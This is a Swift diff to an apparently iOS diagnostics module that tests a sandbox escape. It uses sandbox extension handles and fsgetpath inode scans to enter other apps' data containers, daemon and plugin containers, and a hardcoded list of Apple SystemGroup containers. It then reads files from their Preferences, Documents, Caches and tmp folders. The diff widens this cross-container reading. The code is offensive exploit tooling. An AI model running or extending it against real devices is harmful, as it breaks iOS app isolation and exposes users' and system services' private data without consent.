@@ -25,6 +25,8 @@ enum Diagnostics {
         let metadataID: String
         let readBytes: Int
         let metadataRead: Bool
+        let idRead: Bool
+        let access: Bool
         let error: String
     }
 
@@ -43,7 +45,7 @@ enum Diagnostics {
         let scanReads: Int
 
         var childReads: Int {
-            children.filter { $0.readBytes > 0 || $0.metadataRead }.count
+            children.filter { $0.readBytes > 0 || $0.metadataRead || $0.idRead }.count
         }
 
         var status: Status {
@@ -57,7 +59,7 @@ enum Diagnostics {
 
         var summaryLine: String {
             if scanChildren > 0 {
-                return "父路径 \(handle) · inode 扫描 \(scanChildren) 个子容器 · 可读 \(scanReads)"
+                return "父路径 \(handle) · 扫描 \(scanChildren) 个子容器 · 可读 \(scanReads)"
             }
             var parts: [String] = ["handle \(handle)"]
             parts.append(preListable ? "消费前可读" : "消费前 EPERM")
@@ -92,27 +94,53 @@ enum Diagnostics {
         let path: String
         let deep: Bool
         let scanFallback: Bool
+        let knownChildren: [String]
     }
+
+    private static let systemGroupNames: [String] = [
+        "systemgroup.com.apple.configurationprofiles",
+        "systemgroup.com.apple.mobilegestaltcache",
+        "systemgroup.com.apple.osanalytics",
+        "systemgroup.com.apple.lsd.iconscache",
+        "systemgroup.com.apple.lsd.identifiers",
+        "systemgroup.com.apple.ManagedSettings",
+        "systemgroup.com.apple.sharedpclogging",
+        "systemgroup.com.apple.media.shared.books",
+        "systemgroup.com.apple.nsurlstoragedresources",
+        "systemgroup.com.apple.pisco.suinfo",
+        "systemgroup.com.apple.icloud.findmydevice.managed",
+        "systemgroup.com.apple.mobilestoragemounter",
+        "systemgroup.com.apple.mobileactivationd",
+        "systemgroup.com.apple.sensorkit",
+        "systemgroup.com.apple.powerlog",
+        "systemgroup.com.apple.diagnosticextensionsd",
+        "systemgroup.com.apple.mediaanalysisd",
+        "systemgroup.com.apple.translationd",
+        "systemgroup.com.apple.chronod",
+        "systemgroup.com.apple.coreaudio",
+        "systemgroup.com.apple.ManagedConfiguration.ExternalTrust",
+        "systemgroup.com.apple.cfprefsd"
+    ]
 
     private static let targets: [Target] = [
         Target(label: "AppGroup 根目录",
                path: "/private/var/mobile/Containers/Shared/AppGroup",
-               deep: true, scanFallback: false),
+               deep: true, scanFallback: false, knownChildren: []),
         Target(label: "App 数据容器",
                path: "/private/var/mobile/Containers/Data/Application",
-               deep: true, scanFallback: true),
+               deep: true, scanFallback: true, knownChildren: []),
         Target(label: "InternalDaemon 容器",
                path: "/private/var/mobile/Containers/Data/InternalDaemon",
-               deep: true, scanFallback: true),
+               deep: true, scanFallback: true, knownChildren: []),
         Target(label: "PluginKitPlugin 容器",
                path: "/private/var/mobile/Containers/Data/PluginKitPlugin",
-               deep: true, scanFallback: true),
+               deep: true, scanFallback: true, knownChildren: []),
         Target(label: "SystemGroup (iOS 27)",
                path: "/private/var/containers/Shared/SystemGroup",
-               deep: true, scanFallback: true),
+               deep: true, scanFallback: false, knownChildren: systemGroupNames),
         Target(label: "System 数据 (iOS 27)",
                path: "/private/var/containers/Data/System",
-               deep: false, scanFallback: false),
+               deep: false, scanFallback: false, knownChildren: [])
     ]
 
     static func run(group: String) -> Report {
@@ -293,6 +321,8 @@ enum Diagnostics {
             } else {
                 emit("    [FAIL] parent extension \(handle) \(code(handle))")
 
+                var scannedPaths: [String] = []
+
                 // On iOS 27.0.1 the four container parents refuse the token.
                 // Find their direct children through fsgetpath instead, then
                 // consume a per-container extension like WQFiles does.
@@ -301,29 +331,41 @@ enum Diagnostics {
                         let baseline = wq_baseline_inode()
                         let maxInode = baseline > 0 ? baseline + 100_000 : 0
                         let parents = targets.filter { $0.scanFallback }.map { $0.path }
-                        emit("    fsgetpath scan: baseline \(baseline), max \(maxInode), 25s budget, \(parents.count) parents")
+                        emit("    fsgetpath scan: baseline \(baseline), max \(maxInode), 30s budget, \(parents.count) parents")
                         if maxInode > 0 {
-                            scanCache = (wq_scan_children(parents, maxInode, 4, 25.0)
+                            scanCache = (wq_scan_children(parents, maxInode, 8, 30.0)
                                          as? [String: [String]]) ?? [:]
                         } else {
                             scanCache = [:]
                         }
                     }
 
-                    let paths = scanCache?[target.path] ?? []
-                    scanChildren = paths.count
-                    scanTotal += scanChildren
-                    emit("    fsgetpath: \(scanChildren) child path(s)")
-
-                    if !paths.isEmpty {
-                        let probe = probeScanned(paths: paths,
-                                                 group: effectiveGroup,
-                                                 emit: emit)
-                        scanReads = probe.reads
-                        children = probe.results
-                        deepReads += probe.reads
-                    }
+                    scannedPaths = scanCache?[target.path] ?? []
+                    emit("    fsgetpath: \(scannedPaths.count) child path(s)")
                 }
+
+                var probe = probeScanned(paths: scannedPaths,
+                                         group: effectiveGroup,
+                                         emit: emit)
+                var knownCount = 0
+
+                // SystemGroup children are known names, not discoverable by scan.
+                if !target.knownChildren.isEmpty {
+                    let known = probeKnown(parent: target.path,
+                                           names: target.knownChildren,
+                                           group: effectiveGroup,
+                                           emit: emit)
+                    probe.results.append(contentsOf: known.results)
+                    probe.reads += known.reads
+                    knownCount = known.children
+                    emit("    known names: \(knownCount) reachable")
+                }
+
+                scanChildren = scannedPaths.count + knownCount
+                scanReads = probe.reads
+                children = probe.results
+                deepReads += probe.reads
+                scanTotal += scanChildren
             }
 
             if post != nil { listings += 1 }
@@ -353,7 +395,7 @@ enum Diagnostics {
         }
         stages.append(Stage(title: "目标路径逃逸",
                             status: stage3Status,
-                            detail: "\(handles)/\(targets.count) 个父路径拿到 extension，\(listings) 个目录可读，inode 扫描补充 \(scanTotal) 个子容器"))
+                            detail: "\(handles)/\(targets.count) 个父路径拿到 extension，\(listings) 个目录可读，扫描补充 \(scanTotal) 个子容器"))
 
         let stage4Status: Status = deepReads > 0 ? .pass : (handles > 0 ? .warn : .skip)
         stages.append(Stage(title: "跨容器真实读取",
@@ -417,7 +459,7 @@ enum Diagnostics {
                                         name: child,
                                         group: group,
                                         emit: emit)
-            if result.readBytes > 0 || result.metadataRead { reads += 1 }
+            if result.readBytes > 0 || result.metadataRead || result.idRead { reads += 1 }
             out.append(result)
         }
 
@@ -433,15 +475,34 @@ enum Diagnostics {
 
         for path in paths {
             let name = (path as NSString).lastPathComponent
-            let result = probeContainer(path: path,
-                                        name: name,
-                                        group: group,
-                                        emit: emit)
-            if result.readBytes > 0 || result.metadataRead { reads += 1 }
+            let result = probeContainer(path: path, name: name, group: group, emit: emit)
+            if result.readBytes > 0 || result.metadataRead || result.idRead { reads += 1 }
             results.append(result)
         }
 
         return (reads, results)
+    }
+
+    /// SystemGroup children are not discoverable by fsgetpath reliably; try the
+    /// known container names, the same list WQFiles uses.
+    private static func probeKnown(parent: String,
+                                   names: [String],
+                                   group: String,
+                                   emit: (String) -> Void) -> (children: Int, reads: Int, results: [ChildResult]) {
+        var reads = 0
+        var results: [ChildResult] = []
+
+        for name in names {
+            let result = probeContainer(path: parent + "/" + name,
+                                        name: name,
+                                        group: group,
+                                        emit: emit)
+            guard result.access else { continue }
+            results.append(result)
+            if result.readBytes > 0 || result.metadataRead || result.idRead { reads += 1 }
+        }
+
+        return (results.count, reads, results)
     }
 
     private static func probeContainer(path: String,
@@ -452,38 +513,50 @@ enum Diagnostics {
         if h < 0 {
             emit("      child \(name): extension failed \(h) \(code(h))")
             return ChildResult(name: name, containerID: "?", metadataID: "?",
-                               readBytes: 0, metadataRead: false, error: "ext \(h)")
+                               readBytes: 0, metadataRead: false, idRead: false,
+                               access: false, error: "ext \(h)")
         }
 
         let cid = wq_container_id(path) ?? "?"
         let meta = wq_container_metadata(path)
         let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"
         let metadataRead = (meta != nil)
+        let idRead = (cid != "?")
 
         var readBytes = 0
-        var errText = ""
-        var prefErr: Int32 = 0
-        let prefs = wq_listdir(path + "/Library/Preferences", &prefErr, 8)
+        let locations = ["Library/Preferences", "Documents", "Library/Caches", "tmp"]
 
-        if let prefs = prefs, let first = prefs.first {
-            var readErr: Int32 = 0
-            if let data = wq_readfile(path + "/Library/Preferences/" + first,
-                                      4096, &readErr) {
-                readBytes = data.count
-                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B")
+        for location in locations {
+            var listErr: Int32 = 0
+            guard let entries = wq_listdir(path + "/" + location, &listErr, 8),
+                  !entries.isEmpty else { continue }
+
+            for entry in entries.prefix(3) {
+                var readErr: Int32 = 0
+                if let data = wq_readfile(path + "/" + location + "/" + entry,
+                                          4096, &readErr) {
+                    readBytes = data.count
+                    emit("      child \(name): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B (\(location)/\(entry))")
+                    break
+                }
+            }
+            if readBytes > 0 { break }
+        }
+
+        var errText = ""
+        if readBytes == 0 {
+            if idRead || metadataRead {
+                emit("      child \(name): ext=ok id=\(cid) meta=\(mid) (metadata only)")
             } else {
-                errText = "read errno \(readErr)"
+                errText = "no readable content"
                 emit("      child \(name): ext=ok id=\(cid) meta=\(mid) \(errText)")
             }
-        } else {
-            errText = "prefs errno \(prefErr)"
-            emit("      child \(name): ext=ok id=\(cid) meta=\(mid) prefs=\(prefs?.count ?? 0) \(errText)")
         }
 
         worse_query_release(h)
         return ChildResult(name: name, containerID: cid, metadataID: mid,
                            readBytes: readBytes, metadataRead: metadataRead,
-                           error: errText)
+                           idRead: idRead, access: true, error: errText)
     }
 
     private static func code(_ h: Int64) -> String {
@@ -535,7 +608,7 @@ extension Diagnostics.Report {
         s += "\(subheadline)\n"
         s += "iOS \(iosVersion) | \(device)\n"
         s += "App Group: \(groupIdentifier)\n"
-        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads) | inode 子容器 \(scanChildrenTotal)\n\n"
+        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads) | 扫描子容器 \(scanChildrenTotal)\n\n"
 
         for t in targets {
             let pre = t.preListable ? "可读" : "EPERM(\(t.preErrno))"
@@ -544,7 +617,7 @@ extension Diagnostics.Report {
             s += "  \(t.path)\n"
             s += "  handle=\(t.handle) 消费前=\(pre) 消费后=\(post) 子读取=\(t.childReads)\n"
             if t.scanChildren > 0 {
-                s += "  inode 扫描=\(t.scanChildren) 个子容器 可读=\(t.scanReads)\n"
+                s += "  扫描=\(t.scanChildren) 个子容器 可读=\(t.scanReads)\n"
             }
         }
 
